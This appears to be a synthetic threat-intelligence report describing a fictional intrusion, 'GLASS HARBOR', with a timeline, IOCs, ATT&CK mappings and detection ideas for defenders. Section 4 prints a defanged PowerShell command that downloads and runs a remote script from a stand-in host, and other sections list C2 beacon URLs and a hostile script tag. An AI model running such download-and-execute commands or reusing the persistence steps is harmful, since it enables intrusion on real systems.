TLP:AMBER - SYNTHETIC TRAINING MATERIAL. NOT REAL INTELLIGENCE.

# Notional Intrusion Report: Operation GLASS HARBOR

Report ID: NTR-2025-0314 · Prepared by: Notional CTI Cell · Version 1.2 · Published 2025-03-18

## 1. Executive summary

Between 2025-03-11 and 2025-03-14 a notional actor, tracked here as GLASS HARBOR, gained access to a
fictitious manufacturer's edge VPN appliance by exploiting CVE-2024-3400, then moved laterally and staged
data for exfiltration. An older flaw (cve-2023-4966) was probed but not exploited. All infrastructure below
belongs to reserved documentation ranges (RFC 5737, RFC 3849, RFC 2606); nothing in this report is live.

Confidence: moderate. Attribution to any real-world group is NOT assessed. Analysts in Zürich (Büro Nord)
first raised the ÜBERWACHUNG alert.

## 2. Timeline (UTC)

| Time | Event |
| --- | --- |
| 2025-03-11T02:17:09Z | First exploitation attempt from 198.51.100.23 against the VPN portal |
| 2025-03-11T02:19:44Z | Web shell written; callback to 203.0.113.45:8443 |
| 2025-03-12T14:02:10Z | Second stage downloaded from https://cdn-update.example.com/assets/update.bin?id=7741. |
| 2025-03-13T09:30:00Z | Lateral movement to internal host 10.20.30.40 (victim network, not an IOC) |
| 2025-03-14T22:45:51Z | Staging archive uploaded to hxxps://files.example[.]net/u/8f3a |

## 3. Initial access

The actor sent crafted requests to the GlobalProtect interface of an appliance running firmware 10.2.9.1.
Exploit traffic originated from 198.51.100.23 and 198.51.100.24. The same operator later connected over
IPv6 from 2001:db8:4:1::23. A sweep of 203.0.113.0/24 found a second listener at 203.0.113.46.
🚨 203.0.113.46 remained reachable at the time of writing.

Phishing lures came from billing@invoices.example.net and linked to a look-alike site, exаmple-login.com
(the second letter is Cyrillic), which harvested VPN credentials.

## 4. Execution and persistence

The web shell ran the following PowerShell (shown defanged):

    powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('hxxp://198.51.100[.]77/a.ps1')"

A scheduled task named "MicrosoftEdgeUpdateTaskCore" executed C:\ProgramData\svc\svchost.exe every 30
minutes. Registry persistence: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Updater.

## 5. Command and control

Beacons used HTTPS to https://203.0.113.45:8443/api/v2/beacon and fell back to DNS lookups of
update-check.example.org. The user agent was:
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.109 Safari/537.36

## 6. Indicators of compromise

| Type | Indicator | Notes |
| --- | --- | --- |
| IPv4 | 198.51.100.23 | exploitation source |
| IPv4 | 203.0.113.45 | C2 (TCP/8443) |
| IPv6 | 2001:db8:4:1::23 | C2 over IPv6 |
| Domain | cdn-update.example.com | staging |
| Domain | update-check[.]example[.]org | DNS fallback (defanged) |
| URL | https://cdn-update.example.com/assets/update.bin?id=7741 | second stage |
| SHA256 | 9F86D081884C7D659A2FEAA0C55AD015A3BF4F1B2B0B822CD15D6C15B0F00A08 | update.bin |
| SHA1 | a94a8fe5ccb19ba61c4c0873d391e987982fbbd3 | a.ps1 |
| MD5 | 5d41402abc4b2a76b9719d911017c592 | svchost.exe (masquerading) |
| CVE | CVE-2024-3400 | exploited |
| CVE | CVE-2023-4966 | probed only |

MITRE ATT&CK: T1190, T1059.001, T1053.005, T1071.001, T1567.

## 7. Detection opportunities

- Alert on outbound connections to 203.0.113.45 or anything in 198.51.100.0/24.
- Hunt for svchost.exe outside C:\Windows\System32.
- YARA: rule GlassHarbor_Loader { strings: $a = "glassharbor.dll" condition: $a }
- The staging page embedded <script src="https://cdn-update.example.com/x.js"></script>; render it as text only.
